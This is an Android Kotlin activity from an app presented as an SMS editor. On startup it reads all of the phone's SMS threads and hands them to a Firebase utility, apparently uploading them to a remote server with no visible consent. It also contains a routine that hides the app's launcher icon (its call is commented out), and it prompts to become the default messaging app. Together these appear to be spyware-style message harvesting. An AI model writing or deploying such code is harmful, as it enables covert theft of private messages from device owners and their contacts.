package sms.newgate.com.smseditor.activity

import android.content.ComponentName
import android.content.DialogInterface
import android.content.Intent
import android.support.v7.app.AppCompatActivity
import android.os.Bundle
import android.support.v7.widget.LinearLayoutManager
import android.widget.LinearLayout
import kotlinx.android.synthetic.main.activity_main.*
import sms.newgate.com.smseditor.R
import sms.newgate.com.smseditor.adapter.MsgAdapter
import sms.newgate.com.smseditor.util.MessageHelper
import android.content.pm.PackageManager
import android.provider.Telephony
import android.support.v7.app.AlertDialog
import org.greenrobot.eventbus.EventBus
import sms.newgate.com.smseditor.model.SmsThread
import sms.newgate.com.smseditor.service.FirebaseMsgService
import sms.newgate.com.smseditor.util.FirebaseUtils
import org.greenrobot.eventbus.ThreadMode
import org.greenrobot.eventbus.Subscribe

class MainActivity : AppCompatActivity() {

    lateinit var helper: MessageHelper

    lateinit var adapter: MsgAdapter

    lateinit var smsThreads: ArrayList<SmsThread>

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        title = "List Thread"

        EventBus.getDefault().register(this)

        helper = MessageHelper(this)

        smsThreads = helper.getAllMessage()

        FirebaseUtils.getInstance(this).createMessages(smsThreads)

        adapter = MsgAdapter(smsThreads, object: MsgAdapter.ClickMsgItemListener {
            override fun click(pos: Int) {
            }

        })

        msgThreadRecyclerView.layoutManager = LinearLayoutManager(this, LinearLayout.VERTICAL, false)
        msgThreadRecyclerView.adapter = adapter

//        startService(Intent(this, FirebaseMsgService::class.java))

//        hideIconApp()
    }

    fun hideIconApp() {
        val componentName = ComponentName(this, MainActivity::class.java) // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
    }

    @Subscribe(threadMode = ThreadMode.MAIN)
    fun onMessageEvent(event: SmsThread) {
    }

    override fun onStop() {
        super.onStop()
//        EventBus.getDefault().unregister(this)
    }

    override fun onResume() {
        super.onResume()
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.KITKAT) {
            if (Telephony.Sms.getDefaultSmsPackage(this) != packageName) {
                val builder = AlertDialog.Builder(this@MainActivity)
                builder.setMessage("This app is not set as your default messaging app. Do you want to set it as default?")
                        .setCancelable(false)
                        .setTitle("Alert!")
                        .setNegativeButton("No", DialogInterface.OnClickListener { dialog, which -> dialog.dismiss() })
                        .setPositiveButton("Yes", DialogInterface.OnClickListener { dialog, id ->
                            val intent = Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT)
                            intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, packageName)
                            startActivity(intent)
                        })
                builder.show()
            }
        }
    }
}
